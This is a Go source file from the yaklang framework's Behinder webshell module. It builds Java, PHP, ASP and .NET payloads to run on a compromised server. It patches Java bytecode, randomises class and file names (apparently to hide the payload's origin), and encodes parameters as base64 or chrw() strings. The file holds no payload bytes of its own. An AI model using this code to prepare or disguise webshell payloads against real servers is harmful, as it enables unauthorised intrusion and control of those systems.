package behinder

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"regexp"
	"strconv"
	"strings"
)

const (
	opcodeAload0       byte = 0x2a
	opcodeGetField     byte = 0xb4
	opcodePutField     byte = 0xb5
	opcodeIfNull       byte = 0xc6
	opcodeIfNonNull    byte = 0xc7
	sessionGuardWindow      = 48
)

func normalizeClassParamKey(key string) string {
	if strings.HasPrefix(key, "{{") && strings.HasSuffix(key, "}}") {
		return strings.TrimSuffix(strings.TrimPrefix(key, "{{"), "}}")
	}
	return key
}

func GetRawClass(binPayload string, params map[string]string) ([]byte, error) {
	b, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}
	clsObj, err := javaclassparser.Parse(b)
	if err != nil {
		return nil, err
	}
	repairBrokenSessionBootstrap(clsObj)
	builder := javaclassparser.NewClassObjectBuilder(clsObj)
	for k, v := range params {
		builder.SetParam(normalizeClassParamKey(k), v)
	}
	// 随机更换类名 原始类名是这样的 net/behinder/payload/java/xxx
	err = clsObj.SetClassName(payloads.RandomClassName())
	if err != nil {
		return nil, err
	}
	// 随机更换 文件名
	err = clsObj.SetSourceFileName(utils.RandNumberStringBytes(6))
	if err != nil {
		return nil, err
	}
	// 修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行
	//clsObj.MajorVersion = 49
	return clsObj.Bytes(), nil
	//return clsObj.Bytes(), nil
}

func repairBrokenSessionBootstrap(clsObj *javaclassparser.ClassObject) {
	for _, method := range clsObj.Methods {
		if classMemberName(clsObj, method.NameIndex) != "fillContext" {
			continue
		}
		for _, attr := range method.Attributes {
			codeAttr, ok := attr.(*javaclassparser.CodeAttribute)
			if !ok {
				continue
			}
			repairBrokenSessionGuard(codeAttr.Code)
		}
	}
}

func classMemberName(clsObj *javaclassparser.ClassObject, index uint16) string {
	info := clsObj.ConstantPoolManager.GetUtf8(int(index))
	if info == nil {
		return ""
	}
	return info.Value
}

func repairBrokenSessionGuard(code []byte) {
	index := findSessionBootstrapGuardIndex(code, opcodeIfNull)
	if index == -1 {
		return
	}
	code[index] = opcodeIfNonNull
}

func findSessionBootstrapGuardIndex(code []byte, guardOpcode byte) int {
	for i := 0; i+19 <= len(code); i++ {
		if !matchesSessionBootstrapPrefix(code, i, guardOpcode) {
			continue
		}
		if hasSessionBootstrapPutField(code, i) {
			return i + 11
		}
	}
	return -1
}

func matchesSessionBootstrapPrefix(code []byte, start int, guardOpcode byte) bool {
	if code[start] != opcodeAload0 || code[start+1] != opcodeGetField {
		return false
	}
	if code[start+4] != opcodeIfNull || code[start+7] != opcodeAload0 {
		return false
	}
	if code[start+8] != opcodeGetField || code[start+11] != guardOpcode {
		return false
	}
	if code[start+14] != opcodeAload0 || code[start+15] != opcodeAload0 {
		return false
	}
	if code[start+16] != opcodeGetField {
		return false
	}
	return bytes.Equal(code[start+2:start+4], code[start+17:start+19])
}

func hasSessionBootstrapPutField(code []byte, start int) bool {
	sessionField := code[start+9 : start+11]
	limit := min(start+sessionGuardWindow, len(code)-2)
	for i := start + 19; i < limit; i++ {
		if code[i] != opcodePutField {
			continue
		}
		if bytes.Equal(code[i+1:i+3], sessionField) {
			return true
		}
	}
	return false
}

func GetRawPHP(binPayload string, params map[string]string, funcName string, onlyCode bool) ([]byte, error) {
	payloadBytes, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}
	code := strings.Replace(string(payloadBytes), "<?", "", 1)
	if v, ok := params["customEncoderFromText"]; ok {
		code += v + "\r\n"
	}
	if onlyCode {
		return []byte(code), nil
	}
	paramsList := getPhpParams(payloadBytes, funcName)
	for i, paraName := range paramsList {
		paraValue := ""
		if v, ok := params[paraName]; ok {
			paraValue = base64.StdEncoding.EncodeToString([]byte(v))
			code += fmt.Sprintf("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName)
		} else {
			code += fmt.Sprintf("$%s=\"%s\";", paraName, "")
		}
		paramsList[i] = "$" + paraName
	}
	code += "\r\n" + funcName + "(" + strings.Trim(strings.Join(paramsList, ","), ",") + ");"
	return []byte(code), nil
}

// 获取 php 代码中需要更改的 params
func getPhpParams(phpPayload []byte, funcName string) []string {
	paramList := make([]string, 0, 2)
	mainRegex := regexp.MustCompile(funcName + `\s*\([^)]*\)`)
	mainMatch := mainRegex.Match(phpPayload)
	mainStr := mainRegex.FindStringSubmatch(string(phpPayload))

	if mainMatch && len(mainStr) > 0 {
		paramRegex := regexp.MustCompile(`\$([a-zA-Z]*)`)
		paramMatch := paramRegex.FindAllStringSubmatch(mainStr[0], -1)
		if len(paramMatch) > 0 {
			for _, v := range paramMatch {
				paramList = append(paramList, v[1])
			}
		}
	}

	return paramList
}

func GetRawAssembly(binPayload string, params map[string]string) ([]byte, error) {
	payloadBytes, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}

	if len(params) == 0 {
		return payloadBytes, nil
	}

	var paramTokens []string
	for key, value := range params {
		value = base64.StdEncoding.EncodeToString([]byte(value))
		paramTokens = append(paramTokens, key+":"+value)
	}

	paramsStr := strings.Join(paramTokens, ",")
	token := "~~~~~~" + paramsStr

	return append(payloadBytes, []byte(token)...), nil
}

func GetRawASP(binPayload string, params map[string]string) ([]byte, error) {
	payloadBytes, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}

	if v, ok := params["customEncoderFromText"]; ok {
		payloadBytes = bytes.Replace(payloadBytes, []byte("__Encrypt__"), []byte(v), 1)
		delete(params, "customEncoderFromText")
	}
	var code strings.Builder
	code.WriteString(string(payloadBytes))
	paraList := ""
	if len(params) > 0 {
		paraList = paraList + "Array("
		for _, paramValue := range params {
			var paraValueEncoded string
			for _, v := range paramValue {
				paraValueEncoded = paraValueEncoded + "chrw(" + strconv.Itoa(int(v)) + ")&"
			}
			paraValueEncoded = strings.TrimRight(paraValueEncoded, "&")
			paraList = paraList + "," + paraValueEncoded
		}
		paraList = paraList + ")"
	}
	paraList = strings.Replace(paraList, ",", "", 1)
	code.WriteString("\r\nmain " + paraList + "")
	return []byte(code.String()), nil
}
